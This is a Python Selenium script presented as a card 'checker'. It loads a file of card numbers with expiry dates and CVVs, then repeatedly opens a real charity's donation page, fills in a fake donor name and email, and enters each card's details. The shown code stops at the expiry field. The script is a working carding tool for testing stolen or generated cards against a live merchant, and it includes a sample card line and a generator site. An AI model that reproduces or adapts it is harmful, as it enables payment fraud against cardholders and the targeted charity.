from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium import webdriver
from time import sleep
from colorama import Fore,Back,init

PATCH = "C:\Program Files (x86)\chromedriver.exe"
init()

datos= []
name = []

def goto(linenum):
    global line
    line = linenum

class file():
	def file(self,nombre):
		if ".txt" in nombre:
			file = open(nombre).readlines()
			file = [a.rstrip() for a in file]
			for lines in file:
				datos.append(lines)
			name.append(nombre)
		else:
			file = open(nombre+".txt").readlines()
			file = [a.rstrip() for a in file]
			for lines in file:
				datos.append(lines)
			name.append(nombre+".txt")


banner = """
..######..##.....##.########..######..##....##.########.########.....########..########..##.....##..######..
.##....##.##.....##.##.......##....##.##...##..##.......##.....##....##.....##.##.....##.##.....##.##....##.
.##.......##.....##.##.......##.......##..##...##.......##.....##....##.....##.##.....##.##.....##.##.......
.##.......#########.######...##.......#####....######...########.....########..########..#########.##...####
.##.......##.....##.##.......##.......##..##...##.......##...##......##........##.....##.##.....##.##....##.
.##....##.##.....##.##.......##....##.##...##..##.......##....##.....##........##.....##.##.....##.##....##.
..######..##.....##.########..######..##....##.########.##.....##....##........########..##.....##..######..
"""
menu = """

____________________________________________________________________________________
=========================PROXY CHECK/SCRAPER BY HOLLOWKAT PBHG======================
------------------------------------------------------------------------------------

			+FORMARTO PARA LOS BINS:
			+5223037787798075|05|2022|183
			-PAGINA USADA DE EJEMPLO: https://bestccgen.com/namso-ccgen/

"""

line = 1
while line ==1:
	print(Fore.GREEN+banner)
	print(Fore.GREEN+menu)
	a = "C:/Users/Jesus/Documents/checkers/Bin-checker/cc.txt"
	if len(str(a))  >  0:
		file().file(a)
		print("INICIANDO....")
		sleep(2)
		break
	else:
		print("ESCRIBA UNA DIRECCION VALIDA")
		goto(1)

file = open(name[0]).readlines()
file = [a.rstrip() for a in file]
line = 2

while line == 2:
    datos = [a.rstrip() for a in datos]
    for lines in datos:
        lines = lines.split("|")
        cc = lines[0]
        fecha = lines[1]
        año = lines[2]
        cv = lines[3]

        driver = webdriver.Chrome(PATCH)
        wait = WebDriverWait(driver, 7)

        url = """https://www.cair.com/donate/"""
        driver.get(url)

        a = wait.until(EC.presence_of_element_located((By.XPATH, "//input[@id='give-first']")))
        a.send_keys("Jesus")
        b = wait.until(EC.presence_of_element_located((By.XPATH, "//input[@id='give-last']")))
        b.send_keys("Lopez")
        c = wait.until(EC.presence_of_element_located((By.XPATH, "//input[@id='give-email']")))
        c.send_keys("martinlopez@gmail.com")
        d = wait.until(EC.presence_of_element_located((By.XPATH, "//input[@id='card_number-19623']")))
        d.send_keys(cc)
        e = wait.until(EC.presence_of_element_located((By.XPATH, "//input[@id='card_cvc-19623']")))
        e.send_keys(cv)
        f = wait.until(EC.presence_of_element_located((By.XPATH, "//input[@id='card_name-19623']")))
        f.send_keys("Jesus Lopez")
        g = wait.until(EC.presence_of_element_located((By.XPATH, "//input[@id='card_name-19623']")))
        g.send_keys("Jesus Lopez")
        h = wait.until(EC.presence_of_element_located((By.XPATH, "//input[@id='card_expiry-19623']")))
        h.send_keys(fecha,"/",año)